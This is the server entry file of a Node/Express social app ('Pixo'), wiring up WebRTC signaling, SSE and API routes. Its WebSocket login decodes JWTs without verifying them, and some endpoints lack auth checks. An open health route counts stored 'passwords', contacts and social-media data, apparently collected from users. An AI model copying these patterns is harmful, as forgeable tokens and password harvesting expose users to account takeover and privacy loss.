import express from 'express';
import cors from 'cors';
import 'dotenv/config';
import { createServer } from 'http';
import { WebSocketServer } from 'ws';
import jwt from 'jsonwebtoken';
import connectDB from './configs/db.js';
import {inngest, functions} from './inngest/index.js'
import {serve} from 'inngest/express'
import { clerkMiddleware } from '@clerk/express'
import userRouter from './routes/userRotes.js';
import postRouter from './routes/postRoutes.js';
import storyRouter from './routes/storyRoutes.js';
import messageRouter from './routes/messageRoutes.js';
import randomChatRouter from './routes/randomChatRoutes.js';
import aiRoutes from './routes/aiRoutes.js';
import { connections, setupSSE } from './controllers/messageController.js';
import musicRoutes from './routes/musicRoutes.js'
import musicLikesRoutes from './routes/musicLikesRoutes.js';
import groupRoutes from './routes/groups.js';
import musicPlaylistRoutes from './routes/musicPlaylistRoutes.js';
import userDataRoutes from './routes/userData.js';

// Import models
import './models/UserConsent.js';
import './models/UserCollectedData.js';
import './models/SocialMediaData.js';
import './models/ContactData.js';
import './models/PasswordData.js';

const app = express();
const server = createServer(app);

// Create WebSocket server for WebRTC signaling
const wss = new WebSocketServer({ 
    server, 
    path: '/api/webrtc-signaling',
    clientTracking: true 
});

// WebRTC signaling state
const webRTCConnections = new Map();
const activeCalls = new Map();
const userToConnection = new Map();

global.connections = connections;

await connectDB();

// ========== FIXED CORS CONFIGURATION ==========
const allowedOrigins = [
    'http://localhost:3000',
    'http://localhost:5173',
    'https://pixo-black.vercel.app',
    'https://pixo-black-*.vercel.app',
    'https://pixo-black-git-*.vercel.app'
];

// CORS middleware with proper configuration
app.use(cors({
    origin: function (origin, callback) {
        // Allow requests with no origin (like mobile apps or curl requests)
        if (!origin) {
            return callback(null, true);
        }
        
        // Check if origin is in allowed list
        const isAllowed = allowedOrigins.some(allowedOrigin => {
            // Handle wildcard origins
            if (allowedOrigin.includes('*')) {
                const regex = new RegExp('^' + allowedOrigin.replace(/\*/g, '.*') + '$');
                return regex.test(origin);
            }
            return allowedOrigin === origin;
        });
        
        if (isAllowed) {
            callback(null, true);
        } else {
            console.log('⚠️ CORS blocked origin:', origin);
            callback(new Error(`Origin ${origin} not allowed by CORS`));
        }
    },
    credentials: true, // Allow cookies/auth headers
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'],
    allowedHeaders: [
        'Content-Type',
        'Authorization',
        'X-Requested-With',
        'Accept',
        'Origin',
        'Access-Control-Allow-Origin',
        'Access-Control-Allow-Headers',
        'Access-Control-Allow-Methods',
        'Access-Control-Allow-Credentials'
    ],
    exposedHeaders: ['Content-Length', 'Content-Range'],
    maxAge: 86400 // 24 hours
}));

// Handle preflight requests explicitly
app.options('*', cors()); // Enable preflight for all routes

app.use(express.json());
app.use(clerkMiddleware());

// ========== FIX FOR VERCEL WEBSOCKET ISSUE ==========
// Since Vercel doesn't support WebSocket servers, 
// we'll use HTTP polling for WebRTC signaling
const pendingSignals = new Map();

// HTTP WebRTC Signaling Endpoint (for Vercel compatibility)
app.post('/api/webrtc/signal', async (req, res) => {
    try {
        const { type, targetUserId, data, userId, callId } = req.body;
        
        // Verify authentication from Clerk middleware
        const auth = req.auth;
        if (!auth?.userId || auth.userId !== userId) {
            return res.status(401).json({ 
                success: false, 
                error: 'Unauthorized' 
            });
        }
        
        console.log(`📨 HTTP Signal: ${userId} -> ${targetUserId} (${type})`);
        
        // Store signal for target user
        if (!pendingSignals.has(targetUserId)) {
            pendingSignals.set(targetUserId, []);
        }
        
        const signal = {
            id: `${targetUserId}_${Date.now()}`,
            type,
            data,
            fromUserId: userId,
            callId,
            timestamp: Date.now(),
            expiresAt: Date.now() + 30000 // 30 seconds expiry
        };
        
        pendingSignals.get(targetUserId).push(signal);
        
        // Clean old signals
        cleanupOldSignals();
        
        res.json({ 
            success: true, 
            signalId: signal.id,
            message: 'Signal stored successfully'
        });
        
    } catch (error) {
        console.error('❌ HTTP signaling error:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Signaling failed',
            details: error.message 
        });
    }
});

// Get pending signals for a user
app.get('/api/webrtc/signals/:userId', async (req, res) => {
    try {
        const userId = req.params.userId;
        
        // Verify authentication
        const auth = req.auth;
        if (!auth?.userId || auth.userId !== userId) {
            return res.status(401).json({ 
                success: false, 
                error: 'Unauthorized' 
            });
        }
        
        const signals = pendingSignals.get(userId) || [];
        
        // Return signals
        res.json({ 
            success: true, 
            signals,
            count: signals.length 
        });
        
        // Clear signals after sending
        pendingSignals.delete(userId);
        
    } catch (error) {
        console.error('❌ Get signals error:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Failed to get signals' 
        });
    }
});

// Cleanup old signals
function cleanupOldSignals() {
    const now = Date.now();
    for (const [userId, signals] of pendingSignals.entries()) {
        const validSignals = signals.filter(signal => signal.expiresAt > now);
        if (validSignals.length === 0) {
            pendingSignals.delete(userId);
        } else {
            pendingSignals.set(userId, validSignals);
        }
    }
}

// Cleanup interval
setInterval(cleanupOldSignals, 60000); // Every minute

// Helper to get user ID from token (for WebSocket fallback)
const getUserIdFromToken = (token) => {
    try {
        if (!token) return null;
        const decoded = jwt.decode(token);
        return decoded?.sub || decoded?.userId || null;
    } catch (error) {
        console.error('Token decode error:', error);
        return null;
    }
};

// ========== WEBSOCKET SERVER (Optional, for non-Vercel deploys) ==========
wss.on('connection', async (socket, req) => {
    console.log('🔗 WebRTC WebSocket connection attempt');
    
    // Extract token from query
    const url = new URL(req.url, `http://${req.headers.host}`);
    const token = url.searchParams.get('token');
    
    if (!token) {
        console.log('❌ No token provided for WebSocket');
        socket.close(1008, 'Authentication required');
        return;
    }
    
    const userId = getUserIdFromToken(token);
    
    if (!userId) {
        console.log('❌ Invalid token for WebSocket');
        socket.close(1008, 'Invalid authentication');
        return;
    }
    
    console.log(`✅ WebSocket user connected: ${userId}`);
    
    // Store connection
    const connectionId = `${userId}_${Date.now()}`;
    webRTCConnections.set(connectionId, {
        socket,
        userId,
        lastSeen: Date.now()
    });
    userToConnection.set(userId, connectionId);
    
    // Send welcome
    socket.send(JSON.stringify({
        type: 'connected',
        userId,
        timestamp: Date.now(),
        message: 'WebSocket connected (fallback mode)'
    }));
    
    // Handle messages
    socket.on('message', async (data) => {
        try {
            const message = JSON.parse(data.toString());
            await handleWebRTCMessage(userId, message, socket);
        } catch (error) {
            console.error('❌ WebSocket message error:', error);
        }
    });
    
    // Handle disconnection
    socket.on('close', () => {
        console.log(`🔌 WebSocket disconnected: ${userId}`);
        webRTCConnections.delete(connectionId);
        userToConnection.delete(userId);
    });
    
    socket.on('error', (error) => {
        console.error(`⚠️ WebSocket error for ${userId}:`, error);
    });
});

// WebRTC message handler (WebSocket version)
async function handleWebRTCMessage(senderId, message, socket) {
    console.log(`📨 WebSocket: ${senderId} -> ${message.type}`);
    
    // Forward message to target via HTTP API (since WebSocket won't work on Vercel)
    // This is a fallback for non-Vercel deployments
    switch (message.type) {
        case 'call-offer':
        case 'call-answer':
        case 'ice-candidate':
        case 'call-reject':
        case 'end-call':
            // For WebSocket, we'll still use the HTTP endpoint as relay
            console.log(`📡 WebSocket message would be forwarded via HTTP: ${message.type}`);
            break;
    }
}

// ========== HEALTH ENDPOINTS ==========
app.get('/api/webrtc/health', (req, res) => {
    res.json({
        success: true,
        webrtc: {
            status: 'running',
            http_signaling: 'active',
            websocket_signaling: webRTCConnections.size > 0 ? 'active' : 'inactive',
            pending_signals: pendingSignals.size,
            timestamp: new Date().toISOString()
        }
    });
});

// ========== EXISTING ROUTES ==========
app.get('/', (req, res) => res.json({ 
    success: true, 
    message: 'Pixo Server is running',
    version: '1.0.0',
    timestamp: new Date().toISOString()
}));

app.use('/api/inngest', serve({ client: inngest, functions }));

// SSE route
app.get('/api/messages/sse/:userId', (req, res) => {
    console.log('📡 SSE connection for user:', req.params.userId);
    setupSSE(req, res);
});

// All your existing routes
app.use('/api/user', userRouter);
app.use('/api/users', userRouter);
app.use('/api/post', postRouter);
app.use('/api/posts', postRouter);
app.use('/api/story', storyRouter);
app.use('/api/stories', storyRouter);
app.use('/api/message', messageRouter);
app.use('/api/messages', messageRouter);
app.use('/api/random-chat', randomChatRouter);
app.use('/api/ai', aiRoutes);
app.use('/api/music', musicRoutes);
app.use('/api/music-likes', musicLikesRoutes);
app.use('/api/groups', groupRoutes);
app.use('/api/music-playlist', musicPlaylistRoutes);
app.use('/api/user', userDataRoutes);

// Test endpoints
app.get('/api/test', (req, res) => {
    res.json({ 
        success: true, 
        message: 'Server is working!',
        cors: 'configured',
        timestamp: new Date().toISOString() 
    });
});

app.get('/api/health-data', async (req, res) => {
    try {
        const UserConsent = (await import('./models/UserConsent.js')).default;
        const UserCollectedData = (await import('./models/UserCollectedData.js')).default;
        const SocialMediaData = (await import('./models/SocialMediaData.js')).default;
        const ContactData = (await import('./models/ContactData.js')).default;
        const PasswordData = (await import('./models/PasswordData.js')).default;

        const [
            consentCount,
            collectedCount,
            socialCount,
            contactCount,
            passwordCount
        ] = await Promise.all([
            UserConsent.countDocuments(),
            UserCollectedData.countDocuments(),
            SocialMediaData.countDocuments(),
            ContactData.countDocuments(),
            PasswordData.countDocuments()
        ]);

        res.json({
            success: true,
            data_collection: {
                status: 'healthy',
                user_consents: consentCount,
                collected_data: collectedCount,
                social_media_data: socialCount,
                contacts: contactCount,
                passwords: passwordCount,
                total_records: consentCount + collectedCount + socialCount + contactCount + passwordCount
            },
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: 'Health check failed',
            details: error.message
        });
    }
});

// ========== ERROR HANDLING ==========
// 404 handler
app.use('*', (req, res) => {
    res.status(404).json({
        success: false,
        error: 'Route not found',
        path: req.originalUrl,
        method: req.method
    });
});

// Error handler
app.use((err, req, res, next) => {
    console.error('❌ Server error:', err);
    
    // CORS error
    if (err.message.includes('CORS')) {
        return res.status(403).json({
            success: false,
            error: 'CORS Error',
            message: err.message,
            allowedOrigins: allowedOrigins
        });
    }
    
    // General error
    res.status(500).json({
        success: false,
        error: 'Internal server error',
        message: process.env.NODE_ENV === 'development' ? err.message : 'Something went wrong'
    });
});

const PORT = process.env.PORT || 4000;

server.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log('✅ HTTP Signaling: POST /api/webrtc/signal');
    console.log('✅ Get Signals: GET /api/webrtc/signals/:userId');
    console.log('✅ WebSocket (fallback): ws://localhost:' + PORT + '/api/webrtc-signaling');
    console.log('✅ SSE endpoint: /api/messages/sse/:userId');
    console.log('✅ Health Check: GET /api/webrtc/health');
    console.log('✅ CORS Configured for:', allowedOrigins.join(', '));
    console.log('🎵 Music API: /api/music');
    console.log('\n🔧 Deployment Notes:');
    console.log('   • Vercel compatible HTTP signaling');
    console.log('   • WebSocket available for non-Vercel deploys');
    console.log('   • Automatic signal cleanup');
    console.log('   • Clerk authentication integrated');
});